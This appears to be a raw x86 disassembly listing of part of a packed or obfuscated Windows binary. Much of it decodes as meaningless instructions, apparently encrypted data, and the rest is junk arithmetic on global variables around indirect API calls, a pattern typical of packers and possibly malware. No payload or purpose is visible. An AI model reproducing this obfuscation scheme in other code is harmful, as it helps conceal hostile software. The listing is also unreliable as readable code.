  408e3a:	push   edx
  408e3b:	icebp  
  408e3c:	dec    esi
  408e3d:	les    ebx,FWORD PTR [eax+0x77]
  408e40:	addr16 call 0xb00c84ce
  408e46:	mov    esp,0x4d2f8e72
  408e4b:	sbb    eax,0xfe494e9a
  408e50:	mov    ecx,0xe9dadc4d
  408e55:	sub    DWORD PTR [ebx+0x4dde5566],edi
  408e5b:	sub    dl,BYTE PTR [esp+edi*4]
  408e5e:	mov    bh,0xf3
  408e60:	fidiv  WORD PTR [edx]
  408e62:	mov    ah,0xb2
  408e64:	pop    edx
  408e65:	or     al,0xa6
  408e67:	(bad)  
  408e68:	out    0x1f,al
  408e6a:	(bad)  [ebx]
  408e6c:	or     esp,DWORD PTR [ebx+0x30]
  408e6f:	push   edx
  408e70:	fnsetpm(287 only) 
  408e72:	pop    ss
  408e73:	sar    DWORD PTR [ebx-0x16],cl
  408e76:	jns    0x408e85
  408e78:	in     al,0xd8
  408e7a:	nop
  408e7b:	cld    
  408e7c:	mov    edx,0xec835b62
  408e81:	xor    bh,al
  408e83:	inc    ebp
  408e84:	call   0xcbba43ff
  408e89:	mov    eax,0x9c2b8ae8
  408e8e:	neg    ecx
  408e90:	mov    DWORD PTR [ebp-0x14],eax
  408e93:	adc    DWORD PTR ds:0x4283e9,0x14e
  408e9d:	jmp    0x40911c
  408ea2:	outs   dx,DWORD PTR ds:[esi]
  408ea3:	in     eax,0x49
  408ea5:	rcr    BYTE PTR [esp+esi*2+0x7b],1
  408ea9:	retw   
  408eab:	dec    ebx
  408eac:	jo     0x408e8b
  408eae:	mov    ah,0xdd
  408eb0:	outs   dx,BYTE PTR ds:[esi]
  408eb1:	fnstsw WORD PTR [edx+0x7d]
  408eb4:	mov    esi,0xbec279be
  408eb9:	mov    esi,0x8a85763d
  408ebe:	add    al,0xe0
  408ec0:	push   ss
  408ec1:	jae    0x408e65
  408ec3:	and    DWORD PTR [edi+0x2ae66dc1],0xffffffb0
  408eca:	sbb    bl,0x86
  408ecd:	and    BYTE PTR [ebp+0x17],al
  408ed0:	in     al,0x1a
  408ed2:	inc    ebx
  408ed3:	adc    bh,BYTE PTR [esi+0x3b]
  408ed6:	popa   
  408ed7:	cdq    
  408ed8:	adc    eax,0xed9a5c41
  408edd:	push   cs
  408ede:	xor    al,0xfb
  408ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ee1:	aas    
  408ee2:	dec    ecx
  408ee3:	test   BYTE PTR [eax-0x4af7a93d],bh
  408ee9:	and    eax,0x54ded9a6
  408eee:	bound  ebx,QWORD PTR [edi]
  408ef0:	push   ds
  408ef1:	jbe    0x408ecc
  408ef3:	pop    ss
  408ef4:	xor    edx,DWORD PTR [esi-0x9]
  408ef7:	lods   eax,DWORD PTR ss:[esi]
  408ef9:	shl    DWORD PTR [ecx],0x8
  408efc:	scas   eax,DWORD PTR es:[edi]
  408efd:	inc    ebp
  408efe:	cli    
  408eff:	lods   al,BYTE PTR ds:[esi]
  408f00:	add    ebx,0x29fed9c
  408f06:	push   0x744de431
  408f0b:	rcl    bl,cl
  408f0d:	cmp    ebx,DWORD PTR [edx-0x436ddade]
  408f13:	and    eax,0xad760af2
  408f18:	mov    bl,0xd3
  408f1a:	pop    edx
  408f1b:	pushf  
  408f1c:	sub    eax,0x81ef5e59
  408f21:	fadd   QWORD PTR [edi-0x753832d9]
  408f27:	pop    esp
  408f28:	fiadd  DWORD PTR [edi-0x3678e9a5]
  408f2f:	sbb    eax,0x2e70b3d2
  408f34:	mov    ch,0xa8
  408f36:	xchg   esp,eax
  408f37:	sbb    BYTE PTR [edx],0xf8
  408f3a:	adc    al,0x7e
  408f3c:	jp     0x408ec6
  408f3e:	jae    0x408eda
  408f40:	add    ecx,ebp
  408f42:	jmp    0x65a1:0xd1346b14
  408f49:	out    0x75,eax
  408f4b:	je     0x408ef6
  408f4d:	mov    dl,ch
  408f4f:	hlt    
  408f50:	xchg   ebp,eax
  408f51:	(bad)  
  408f52:	jne    0x408f74
  408f54:	out    0x3a,eax
  408f56:	jbe    0x408f14
  408f58:	pushf  
  408f59:	clc    
  408f5a:	loop   0x408ee4
  408f5c:	mov    edx,0x9e851e48
  408f61:	aam    0x51
  408f63:	sbb    eax,0x5fac56bd
  408f68:	sbb    DWORD PTR [edx],0x6d
  408f6b:	fnstenv [esi+0x6df508ac]
  408f71:	add    eax,DWORD PTR [ebx+0x48b800ad]
  408f77:	inc    ecx
  408f78:	mov    al,ds:0x6de605f2
  408f7d:	adc    BYTE PTR [ebx+0x3b],cl
  408f80:	mov    DWORD PTR [ebx+0x238d5b7a],esi
  408f86:	loopne 0x408f90
  408f88:	sbb    esp,0x14c3462c
  408f8e:	mov    ecx,0x34e401ae
  408f93:	jbe    0x408fe0
  408f95:	sbb    BYTE PTR [esi],al
  408f97:	add    esi,DWORD PTR [esi+0x6f]
  408f9a:	(bad)  
  408f9b:	sbb    dl,BYTE PTR [edx+0x32608e50]
  408fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fa2:	xor    ch,ah
  408fa4:	retf   
  408fa5:	pushw  ss
  408fa7:	das    
  408fa8:	mov    al,0x79
  408faa:	add    DWORD PTR [eax-0x21],ebx
  408fad:	jg     0x408fd8
  408faf:	pop    ebp
  408fb0:	rcr    BYTE PTR [eax+0x417c2a07],0x7
  408fb7:	xchg   edi,eax
  408fb8:	in     eax,0xc8
  408fba:	inc    ebp
  408fbb:	mov    dh,0x5d
  408fbd:	jmp    0x408f8d
  408fbf:	mov    ebp,0x762f9553
  408fc4:	jmp    0x24544106
  408fc9:	stc    
  408fca:	jo     0x408fcd
  408fcc:	inc    ecx
  408fcd:	adc    eax,0x26717727
  408fd2:	(bad)  
  408fd3:	test   al,0xae
  408fd5:	mov    ecx,DWORD PTR [ebx+0x1fcea2df]
  408fdb:	adc    DWORD PTR [edx-0x17],0x559ae702
  408fe2:	(bad)  
  408fe3:	fidiv  DWORD PTR [ecx]
  408fe5:	inc    eax
  408fe6:	aaa    
  408fe7:	or     DWORD PTR [edx+0x773b042b],0x2fb935e8
  408ff1:	or     al,0x6b
  408ff3:	cmovo  ebp,DWORD PTR [edi]
  408ff6:	loope  0x409029
  408ff8:	mov    ds,WORD PTR [ecx+ebx*8]
  408ffb:	scas   al,BYTE PTR es:[edi]
  408ffc:	mov    ch,BYTE PTR [eax]
  408ffe:	jne    0x408f88
  409000:	(bad)  
  409001:	sbb    DWORD PTR [edi+eax*4],esi
  409004:	lods   al,BYTE PTR ds:[esi]
  409005:	shl    BYTE PTR [esi+0x28d659d3],1
  40900b:	daa    
  40900c:	cdq    
  40900d:	daa    
  40900e:	ins    BYTE PTR es:[edi],dx
  40900f:	sub    BYTE PTR [eax-0x21e056c],bl
  409015:	mov    esi,0x906e711d
  40901a:	cmp    dl,dl
  40901c:	es jecxz 0x408fab
  40901f:	aas    
  409020:	mov    cl,0xbd
  409022:	clc    
  409023:	cmp    eax,0x38aa747b
  409028:	jo     0x409048
  40902a:	fsubr  QWORD PTR [eax+eax*2-0x5cd4864d]
  409031:	xor    bl,BYTE PTR [edx]
  409033:	in     al,dx
  409034:	aad    0xe7
  409036:	xchg   ebx,eax
  409037:	out    dx,al
  409038:	xor    cl,bl
  40903a:	mov    cl,0x10
  40903c:	fcomp  QWORD PTR [ebx+ebp*4+0x4e]
  409040:	lock sbb al,0x33
  409043:	push   es
  409044:	mov    edx,0xb8f07684
  409049:	popf   
  40904a:	test   al,0x59
  40904c:	test   eax,0xcbf5b4e9
  409051:	xor    BYTE PTR [eax+0x26],al
  409054:	adc    DWORD PTR [ebp+0x10],esi
  409057:	(bad)
  40905b:	hlt    
  40905c:	and    ch,BYTE PTR [ebx+0x68]
  40905f:	shl    DWORD PTR [esi+edx*8+0x0],cl
  409063:	mov    ds:0x25767b00,eax
  409068:	mov    ds:0xda5fb646,eax
  40906d:	cmp    eax,0xdb04a951
  409072:	rcr    BYTE PTR [ecx-0x65],1
  409075:	retf   0xe623
  409078:	jge    0x4090ba
  40907a:	sbb    DWORD PTR [eax],esp
  40907c:	jns    0x409066
  40907e:	cmp    al,0xa8
  409080:	out    0x59,al
  409082:	iret   
  409083:	push   es
  409084:	pop    ecx
  409085:	sbb    esi,eax
  409087:	mov    ebx,0x8b505d86
  40908c:	push   0xffffff8b
  40908e:	sub    BYTE PTR [edi+0x78],0x45
  409092:	dec    ebx
  409093:	add    al,0x9a
  409095:	dec    edx
  409096:	hlt    
  409097:	ja     0x409072
  409099:	jle    0x409098
  40909b:	lea    edx,ds:0x4909d532
  4090a1:	aas    
  4090a2:	fsubrp st(7),st
  4090a4:	sbb    dl,BYTE PTR [eax+0x5d]
  4090a7:	les    esp,FWORD PTR [ebx-0x45]
  4090aa:	lock repz sbb dl,BYTE PTR ds:0xe2e0b965
  4090b2:	and    BYTE PTR [ebp-0x38],0xa1
  4090b6:	sub    DWORD PTR [ebx-0xe],0x5f27e9fa
  4090bd:	bound  edi,QWORD PTR [edx]
  4090bf:	adc    ebp,edx
  4090c1:	ret    0xcd27
  4090c4:	push   ecx
  4090c5:	cmp    BYTE PTR [edi+0x1046a912],0xa
  4090cc:	daa    
  4090cd:	js     0x40908d
  4090cf:	add    BYTE PTR [ecx],0xef
  4090d2:	stos   DWORD PTR es:[edi],eax
  4090d3:	mov    edi,0xa8a6e656
  4090d8:	loope  0x409132
  4090da:	inc    edi
  4090db:	jmp    0x43eddf07
  4090e0:	cmp    ecx,eax
  4090e2:	mov    dl,0xd0
  4090e4:	fcom   DWORD PTR [eax+0x22abb71f]
  4090ea:	fmul   st,st(1)
  4090ec:	dec    ecx
  4090ed:	and    eax,0xcb8afaa8
  4090f2:	in     eax,dx
  4090f3:	or     eax,0x1f3f6e98
  4090f8:	hlt    
  4090f9:	mov    WORD PTR [esi-0x1d],ss
  4090fc:	in     eax,0x21
  4090fe:	imul   ebx,DWORD PTR [ecx+0x14d13fcc],0x6c
  409105:	or     ebp,DWORD PTR [ebp-0x26]
  409108:	shr    BYTE PTR [edx],1
  40910a:	xchg   BYTE PTR [eax],ah
  40910c:	out    dx,eax
  40910d:	call   0xdd86:0xb94e2f2
  409114:	sbb    DWORD PTR [ecx-0x6bc08d40],ebx
  40911a:	fistp  WORD PTR [ecx+0x72d045c7]
  409120:	mov    ch,0x79
  409122:	retf   
  409123:	mov    DWORD PTR [ebp-0x2c],eax
  409126:	cmp    DWORD PTR ds:0x428511,0x0
  40912d:	mov    DWORD PTR ds:0x42850d,0x24a6
  409137:	mov    DWORD PTR ds:0x4283c1,0x40da
  409141:	jmp    0x4091a4
  409146:	not    eax
  409148:	mov    DWORD PTR ds:0x428465,0x7db9
  409152:	cmp    DWORD PTR ds:0x428511,0x0
  409159:	jae    0x409182
  40915f:	push   0x1999
  409164:	push   0x4280e7
  409169:	push   0x428293
  40916e:	call   DWORD PTR ds:0x42e0c8
  409174:	sub    ecx,DWORD PTR ds:0x428309
  40917a:	and    ecx,ecx
  40917c:	adc    DWORD PTR ds:0x4283a9,ebx
  409182:	mov    ecx,DWORD PTR ds:0x428411
  409188:	add    DWORD PTR ds:0x4282e1,ecx
  40918e:	neg    DWORD PTR ds:0x4282d5
  409194:	xor    DWORD PTR ds:0x428495,ebx
  40919a:	or     DWORD PTR ds:0x4283c9,0x673
  4091a4:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  4091ab:	mov    DWORD PTR [ebp-0x24],0x29bd2
  4091b2:	mov    DWORD PTR [ebp-0x20],0x6ec3
  4091b9:	sbb    eax,ecx
  4091bb:	push   esi
  4091bc:	mov    DWORD PTR [ebp-0x1c],0x2a74
  4091c3:	xor    ecx,ecx
  4091c5:	xor    ecx,DWORD PTR ds:0x428359
  4091cb:	mov    eax,ds:0x4284cd
  4091d0:	sub    ecx,eax
  4091d2:	or     ecx,DWORD PTR [ecx+eax*1]
  4091d5:	mov    DWORD PTR [ebp-0x10],0x2e2c
  4091dc:	push   0x5285
  4091e1:	or     DWORD PTR ds:0x4282e1,ecx
  4091e7:	mov    DWORD PTR [ebp-0xc],0x3d0a
  4091ee:	and    ecx,ecx
  4091f0:	mov    eax,DWORD PTR [ebp-0x10]
  4091f3:	and    ecx,DWORD PTR ds:0x428491
  4091f9:	mov    ecx,DWORD PTR [ebp-0xc]
  4091fc:	sub    DWORD PTR ds:0x428491,0x428519
  409206:	push   0x712c
  40920b:	or     DWORD PTR ds:0x42849d,0x4283b9
  409215:	push   ecx
  409216:	sbb    DWORD PTR ds:0x42848d,0x3312
  409220:	push   eax
  409221:	call   0x41594e
  409226:	and    DWORD PTR ds:0x42848d,edi
  40922c:	mov    ecx,DWORD PTR [ebp-0x20]
  40922f:	mov    esi,DWORD PTR [ebp-0x1c]
  409232:	and    DWORD PTR ds:0x428499,0x4283b1
  40923c:	push   0x5f43
  409241:	and    DWORD PTR ds:0x4283e1,0x4284fd
  40924b:	or     edx,0x69b4
  409251:	push   0x1657
  409256:	or     eax,0x528b
  40925b:	xor    edx,esi
  40925d:	xor    eax,ecx
  40925f:	xor    DWORD PTR ds:0x4283c5,0x428469
  409269:	push   edx
  40926a:	push   eax
  40926b:	or     DWORD PTR ds:0x428309,0x42c0
  409275:	call   0x41594e
  40927a:	mov    esi,DWORD PTR ds:0x4283cd
  409280:	xor    esi,DWORD PTR ds:0x428405
  409286:	mov    DWORD PTR ds:0x4283cd,esi
  40928c:	mov    ecx,DWORD PTR [ebp-0x28]
  40928f:	and    esi,DWORD PTR ds:0x428509
  409295:	jmp    0x409514
  40929a:	aam    0x9e
  40929c:	jp     0x409286
  40929e:	mov    esp,0xba543b
  4092a3:	ret    0x923c
  4092a6:	mov    edx,eax
  4092a8:	iret   
  4092a9:	nop
  4092aa:	xor    eax,0x79bebe83
  4092af:	ret    0xbebe
  4092b2:	daa    
  4092b3:	jmp    0x87af56b9
  4092b8:	repnz in eax,dx
  4092ba:	mov    ss,WORD PTR [ecx-0x67d9e4bf]
  4092c0:	neg    DWORD PTR [edi]
  4092c2:	stos   BYTE PTR es:[edi],al
  4092c3:	fst    DWORD PTR [edx]
  4092c5:	sub    eax,0x9c1157a3
  4092ca:	mov    BYTE PTR [eax-0x2abf8783],al
  4092d0:	sub    al,0xb5
  4092d2:	cmp    ah,BYTE PTR [edx-0x668e1bfb]
  4092d8:	inc    edi
  4092d9:	jb     0x409260
  4092db:	jge    0x4092c9
  4092dd:	inc    ebp
  4092de:	sbb    BYTE PTR [ebp-0x5fe9d019],bh
  4092e4:	jne    0x409292
  4092e6:	scas   al,BYTE PTR es:[edi]
  4092e7:	aas    
  4092e8:	fcom   QWORD PTR [ecx]
  4092ea:	mov    dl,0xde
  4092ec:	jmp    0x8b13:0x61e9dbc0
  4092f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092f4:	in     eax,0xbe
  4092f6:	cmp    BYTE PTR [edx+0x3d7cce5],bh
  4092fc:	imul   edx,DWORD PTR [edi],0x56
  4092ff:	mov    ss,WORD PTR [edi+0xf2be6fb]
  409305:	pushf  
  409306:	lds    eax,FWORD PTR ss:[ebp-0x77cec403]
  40930d:	js     0x409307
  40930f:	sub    eax,0x4bf0e072
  409314:	pop    edi
  409315:	stos   BYTE PTR es:[edi],al
  409316:	and    DWORD PTR [eax-0x3c836dfc],edx
  40931c:	inc    esp
  40931d:	dec    ebp
  40931e:	ds cmp ax,0x51e1
  409323:	stos   DWORD PTR es:[edi],eax
  409324:	add    al,0x5e
  409326:	ja     0x409320
  409328:	daa    
  409329:	mov    eax,ds:0x72e4392c
  40932e:	fisubr WORD PTR ds:0xecfdc324
  409334:	aas    
  409335:	out    0xc1,eax
  409337:	aas    
  409338:	xchg   edi,eax
  409339:	test   al,0x91
  40933b:	std    
  40933c:	sbb    eax,0x6c11fc94
  409341:	loopne 0x409351
  409343:	lods   eax,DWORD PTR ds:[esi]
  409344:	adc    eax,0xaeba96c5
  409349:	jno    0x409374
  40934b:	fsubr  QWORD PTR [edi+0x3f]
  40934e:	sar    DWORD PTR [edx+0x41],cl
  409351:	neg    DWORD PTR [ecx+0x5fb8d8c7]
  409357:	lods   al,BYTE PTR ds:[esi]
  409358:	je     0x4092e0
  40935a:	icebp  
  40935b:	fwait
  40935c:	and    DWORD PTR [esi+0x59],eax
  40935f:	push   esi
  409360:	pop    edx
  409361:	push   edi
  409362:	imul   esp,ebp,0x8be080c
  409368:	jle    0x409319
  40936a:	daa    
  40936b:	push   ecx
  40936c:	(bad)  
  40936d:	mov    esp,0xf82a9927
  409372:	pop    esp
  409373:	addr16 jg 0x40939a
  409376:	clc    
  409377:	or     ah,BYTE PTR [edx]
  409379:	or     eax,0xb9e4a959
  40937e:	xor    al,0x60
  409380:	or     eax,0xe5ac383c
  409385:	and    ch,BYTE PTR [eax]
  409387:	mov    ah,0x67
  409389:	das    
  40938a:	stos   DWORD PTR es:[edi],eax
  40938b:	jge    0x40936d
  40938d:	fmul   st(6),st
  40938f:	xchg   ecx,eax
  409390:	adc    eax,0xfee20ca8
  409395:	push   ebx
  409396:	mov    ds:0x493f633d,eax
  40939b:	scas   eax,DWORD PTR es:[edi]
  40939c:	stc    
  40939d:	cmp    BYTE PTR [edi+0x511620f2],bh
  4093a3:	inc    bx
  4093a5:	(bad)  [esi+0x663d1b9d]
  4093ab:	xchg   edx,eax
  4093ac:	test   ecx,edi
  4093ae:	lds    esi,FWORD PTR [edi]
  4093b0:	sbb    ebp,edx
  4093b2:	jp     0x4093e7
  4093b4:	add    edx,edi
  4093b6:	dec    edi
  4093b7:	call   0xc66562ac
  4093bc:	mov    WORD PTR [ecx-0x7aa46288],?
  4093c2:	mov    ds:0x33ea3c87,eax
  4093c7:	test   DWORD PTR ds:0x2e4635c0,edi
  4093cd:	(bad)  
  4093ce:	addr16 jnp 0x40942e
  4093d1:	inc    edx
  4093d2:	(bad)  
  4093d5:	mov    ah,0xbe
  4093d7:	lock xchg edx,eax
  4093d9:	sub    DWORD PTR [ebx+0x7c8f176],0xffffffb1
  4093e0:	cwde   
  4093e1:	xchg   esi,eax
  4093e2:	xor    al,0x68
  4093e4:	jnp    0x40941d
  4093e6:	aaa    
  4093e7:	cmp    BYTE PTR [eax-0x792dfbe0],bl
  4093ed:	ficom  WORD PTR [esi+0xe177a]
  4093f3:	mov    ecx,0x6dbe3a59
  4093f8:	mov    eax,ds:0x37cb728
  4093fd:	addr16 int 0xb
  409400:	jo     0x409450
  409402:	add    DWORD PTR [ebp-0x231c67a0],ecx
  409408:	dec    esi
  409409:	sbb    DWORD PTR [ecx],esp
  40940b:	test   BYTE PTR ds:0x4a1351a8,0xa1
  409412:	out    0xa6,eax
  409414:	mov    al,ds:0xac99c447
  409419:	xchg   edx,eax
  40941a:	xchg   edx,eax
  40941b:	jae    0x409412
  40941d:	mov    dh,0x29
  40941f:	add    ecx,esi
  409421:	sahf   
  409422:	pop    esp
  409423:	pop    ecx
  409424:	in     eax,0x7b
  409426:	ja     0x4093e9
  409428:	sub    BYTE PTR [ecx],ah
  40942a:	aad    0x98
  40942c:	dec    ebx
  40942d:	dec    esp
  40942e:	rcr    edx,1
  409430:	test   al,0xbb
  409432:	outs   dx,BYTE PTR ds:[esi]
  409433:	fwait
  409434:	inc    esp
  409435:	sub    DWORD PTR ds:0x8041a31,esi
  40943b:	call   0xa035cbd3
  409440:	mov    ecx,0x747b2808
  409445:	lods   al,BYTE PTR ds:[esi]
  409446:	mov    esi,0x1b4dbbd4
  40944b:	stc    
  40944c:	lahf   
  40944d:	xchg   edi,eax
  40944e:	cld    
  40944f:	add    al,ch
  409451:	jle    0x409458
  409453:	lds    edx,FWORD PTR [esi]
  409455:	or     BYTE PTR [esi],0x22
  409458:	leave  
  409459:	xchg   esi,eax
  40945a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40945b:	and    BYTE PTR [edx+eiz*4-0x27118365],0x1e
  409463:	out    dx,al
  409464:	mov    ds:0xa1b41e2f,al
  409469:	lds    ebx,FWORD PTR ds:0x8aa7784a
  40946f:	mov    ebx,0x3f607a49
  409474:	jecxz  0x4094b3
  409476:	lds    ebp,FWORD PTR [esp+ecx*2+0x41]
  40947a:	mov    ah,0x60
  40947c:	bound  edi,QWORD PTR [esi-0x78c6490d]
  409482:	push   ebp
  409483:	nop
  409484:	sbb    BYTE PTR [esi-0x41],bh
  409487:	mov    ebx,0x90c0e87f
  40948c:	sbb    eax,0xff01e68b
  409491:	repz mov ah,0x2c
  409494:	daa    
  409495:	aad    0xd8
  409497:	sub    BYTE PTR [bx+di],bl
  40949a:	fcomp  DWORD PTR [ecx]
  40949c:	(bad)  
  40949d:	fidivr WORD PTR [ebx]
  40949f:	gs mov edi,0x911a9789
  4094a5:	add    al,0x2d
  4094a7:	lds    ecx,FWORD PTR [edx-0x2b]
  4094aa:	inc    ebx
  4094ab:	xlat   BYTE PTR ds:[ebx]
  4094ac:	xchg   DWORD PTR [eax+0xa],edi
  4094af:	sub    dh,al
  4094b1:	cmp    eax,DWORD PTR [eax]
  4094b3:	repz fild DWORD PTR [esi-0x2081f81]
  4094ba:	enter  0xfbff,0x9c
  4094be:	leave  
  4094bf:	sub    BYTE PTR [edi+0x4651c55c],bh
  4094c5:	es jg  0x4094cc
  4094c8:	or     DWORD PTR [esi+eiz*8+0x79],ebx
  4094cc:	xor    BYTE PTR [esi],0x18
  4094cf:	gs cwde 
  4094d1:	push   esp
  4094d2:	lods   eax,DWORD PTR ds:[esi]
  4094d3:	push   0x2c
  4094d5:	je     0x4094ca
  4094d7:	retf   
  4094d8:	out    0x74,al
  4094da:	push   ebp
  4094db:	mov    eax,0x77c71dd
  4094e0:	loope  0x409462
  4094e2:	lahf   
  4094e3:	mov    edx,edx
  4094e5:	jle    0x4094fa
  4094e7:	and    DWORD PTR [edx],ebp
  4094e9:	jg     0x409501
  4094eb:	(bad)  
  4094ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ed:	popf   
  4094ee:	pop    ecx
  4094ef:	pop    edi
  4094f0:	scas   eax,DWORD PTR es:[edi]
  4094f1:	adc    al,0x88
  4094f3:	int    0x34
  4094f5:	fnstenv [ebx-0xb]
  4094f8:	lods   al,BYTE PTR ds:[esi]
  4094f9:	sbb    eax,0xc5aaff66
  4094fe:	xlat   BYTE PTR fs:[ebx]
  409500:	dec    esp
  409501:	add    BYTE PTR [esi-0x35],0x81
  409505:	arpl   WORD PTR [ecx],si
  409507:	sbb    DWORD PTR ds:0x5a91baf9,ebp
  40950d:	mov    al,ds:0xca0ba5ae
  409512:	push   esp
  409513:	hlt    
  409514:	mov    esi,DWORD PTR [ebp-0x24]
  409517:	adc    DWORD PTR ds:0x4282ed,0x61cb
  409521:	push   esi
  409522:	dec    DWORD PTR ds:0x4282e1
  409528:	push   ecx
  409529:	not    DWORD PTR ds:0x4284f1
  40952f:	push   edx
  409530:	adc    DWORD PTR ds:0x4283f1,0x42840d
  40953a:	push   eax
  40953b:	sbb    DWORD PTR ds:0x4282e5,0x4282ed
  409545:	call   0x422220
  40954a:	mov    DWORD PTR [ebp-0x30],eax
  40954d:	cmp    DWORD PTR ds:0x4283d9,0x0
  409554:	mov    ecx,0x19e0
  409559:	mov    DWORD PTR ds:0x4284e9,0x71a7
  409563:	mov    ecx,0x1714
  409568:	jmp    0x4095c4
  40956d:	movzx  eax,BYTE PTR ds:0x4283d5
  409574:	mov    eax,0x70fc
  409579:	cmp    DWORD PTR ds:0x4283d9,0x0
  409580:	jb     0x4095ac
  409586:	push   0x4283f1
  40958b:	push   0x428293
  409590:	call   DWORD PTR ds:0x42e24c
  409596:	and    DWORD PTR ds:0x4284fd,0x600c
  4095a0:	add    ecx,DWORD PTR ds:0x4283ed
  4095a6:	or     ecx,DWORD PTR ds:0x428405
  4095ac:	adc    ecx,esi
  4095ae:	sbb    DWORD PTR ds:0x42848d,edx
  4095b4:	sbb    DWORD PTR ds:0x4283e1,0x1a7e
  4095be:	add    esi,0x6267
  4095c4:	mov    DWORD PTR [ebp-0x2c],edx
  4095c7:	mov    DWORD PTR [ebp-0x10],0x5fa8
  4095ce:	mov    DWORD PTR [ebp-0xc],0x1751
  4095d5:	or     DWORD PTR ds:0x428405,0x428521
  4095df:	mov    DWORD PTR [ebp-0x20],0x5e90
  4095e6:	sub    DWORD PTR ds:0x4283b5,ecx
  4095ec:	mov    DWORD PTR [ebp-0x1c],0xfc1
  4095f3:	mov    edx,DWORD PTR ds:0x428389
  4095f9:	mov    edx,DWORD PTR [edx]
  4095fb:	adc    DWORD PTR ds:0x4282fd,edx
  409601:	mov    DWORD PTR [ebp-0x28],0x7044
  409608:	or     DWORD PTR ds:0x4283cd,0x3ffc
  409612:	mov    DWORD PTR [ebp-0x24],0x7bf
  409619:	mov    eax,DWORD PTR [ebp-0x28]
  40961c:	adc    ecx,0x6b26
  409622:	mov    ecx,DWORD PTR [ebp-0x24]
  409625:	add    DWORD PTR ds:0x428511,edi
  40962b:	mov    edx,DWORD PTR [ebp-0x20]
  40962e:	cmp    DWORD PTR ds:0x4283d5,0x0
  409635:	mov    DWORD PTR ds:0x4283dd,edi
  40963b:	mov    DWORD PTR ds:0x4283a5,ecx
  409641:	mov    DWORD PTR ds:0x4283e5,0x2db2
  40964b:	jmp    0x409715
  409650:	mov    esi,DWORD PTR ds:0x4283e1
  409656:	mov    DWORD PTR ds:0x428479,ebx
  40965c:	cmp    DWORD PTR ds:0x4283d5,0x0
  409663:	jg     0x409686
  409669:	push   0x3d0d
  40966e:	call   DWORD PTR ds:0x42e000
  409674:	xor    DWORD PTR ds:0x4283d9,ecx
  40967a:	sbb    DWORD PTR ds:0x4283d5,edi
  409680:	dec    DWORD PTR ds:0x4282e9
  409686:	mov    esi,DWORD PTR ds:0x4282d5
  40968c:	xor    DWORD PTR ds:0x42847d,esi
  409692:	and    DWORD PTR ds:0x428485,ecx
  409698:	dec    esi
  409699:	cmp    DWORD PTR ds:0x428489,0x0
  4096a0:	mov    DWORD PTR ds:0x428491,0x1a91
  4096aa:	movzx  esi,BYTE PTR ds:0x4282e1
  4096b1:	mov    esi,0x63fe
  4096b6:	jmp    0x409715
  4096bb:	mov    DWORD PTR ds:0x4283cd,0x20e7
  4096c5:	cmp    DWORD PTR ds:0x428489,0x0
  4096cc:	jae    0x4096f5
  4096d2:	push   DWORD PTR [ebp-0x20]
  4096d5:	push   0x278f
  4096da:	push   DWORD PTR [ebp-0x1c]
  4096dd:	call   DWORD PTR ds:0x42e004
  4096e3:	or     esi,DWORD PTR ds:0x428471
  4096e9:	sbb    esi,DWORD PTR ds:0x428465
  4096ef:	and    DWORD PTR ds:0x4282cd,edx
  4096f5:	dec    DWORD PTR ds:0x428509
  4096fb:	or     esi,0x67c0
  409701:	add    DWORD PTR ds:0x4283b5,0x146d
  40970b:	sbb    DWORD PTR ds:0x428505,0xdcf
  409715:	mov    esi,DWORD PTR [ebp-0x1c]
  409718:	add    eax,0x355c
  40971d:	mov    DWORD PTR ds:0x42830d,0x28d
  409727:	adc    ecx,0x819
  40972d:	xor    DWORD PTR ds:0x4282d1,0x49ee
  409737:	or     eax,edx
  409739:	mov    DWORD PTR ds:0x428305,0x383a
  409743:	mov    edx,DWORD PTR [ebp-0x10]
  409746:	or     ecx,esi
  409748:	sub    DWORD PTR ds:0x4282f9,0x6778
  409752:	mov    esi,DWORD PTR [ebp-0xc]
  409755:	or     eax,edx
  409757:	movzx  edx,BYTE PTR ds:0x4284ed
  40975e:	xor    edx,DWORD PTR ds:0x428405
  409764:	mov    DWORD PTR ds:0x4284ed,edx
  40976a:	mov    edx,DWORD PTR [ebp-0x30]
  40976d:	or     ecx,esi
  40976f:	mov    esi,DWORD PTR [ebp-0x2c]
  409772:	or     eax,0xf34
  409777:	neg    DWORD PTR ds:0x428409
  40977d:	or     ecx,0x6c90
  409783:	mov    DWORD PTR ds:0x4283fd,0x7584
  40978d:	cmp    edx,eax
  40978f:	mov    DWORD PTR ds:0x4283e1,0x7ecb
  409799:	jne    0x4097bb
  40979f:	mov    DWORD PTR ds:0x4283ad,0x4655
  4097a9:	cmp    esi,ecx
  4097ab:	mov    DWORD PTR ds:0x4283ad,0x7ff3
  4097b5:	je     0x40a10f
  4097bb:	xor    esi,esi
  4097bd:	or     esi,DWORD PTR ds:0x4284fd
  4097c3:	adc    DWORD PTR ds:0x428485,esi
  4097c9:	mov    DWORD PTR [ebp-0x30],0x5ddc
  4097d0:	mov    DWORD PTR [ebp-0x2c],0x7433
  4097d7:	mov    eax,DWORD PTR [ebp-0x30]
  4097da:	mov    ecx,DWORD PTR [ebp-0x2c]
  4097dd:	xor    ecx,0xfffffd1f
  4097e3:	xor    eax,0xffff9fff
  4097e8:	and    ecx,0x6e0
  4097ee:	and    eax,0x6244
  4097f3:	mov    DWORD PTR [ebp-0x10],eax
  4097f6:	mov    DWORD PTR [ebp-0xc],ecx
  4097f9:	mov    DWORD PTR [ebp-0x20],0x4a50
  409800:	mov    DWORD PTR [ebp-0x1c],0x2079
  409807:	mov    DWORD PTR [ebp-0x28],0x792e
  40980e:	mov    DWORD PTR [ebp-0x24],0x10e8
  409815:	mov    DWORD PTR [ebp-0x30],0x22b3
  40981c:	mov    DWORD PTR [ebp-0x2c],0x2293
  409823:	mov    eax,DWORD PTR [ebp-0x30]
  409826:	mov    ecx,DWORD PTR [ebp-0x2c]
  409829:	mov    edx,DWORD PTR [ebp-0x28]
  40982c:	mov    esi,DWORD PTR [ebp-0x24]
  40982f:	add    eax,edx
  409831:	mov    edx,DWORD PTR [ebp-0x20]
  409834:	adc    ecx,esi
  409836:	mov    esi,DWORD PTR [ebp-0x1c]
  409839:	add    eax,0x3e60
  40983e:	adc    ecx,0xd49e
  409844:	xor    eax,0x14ce
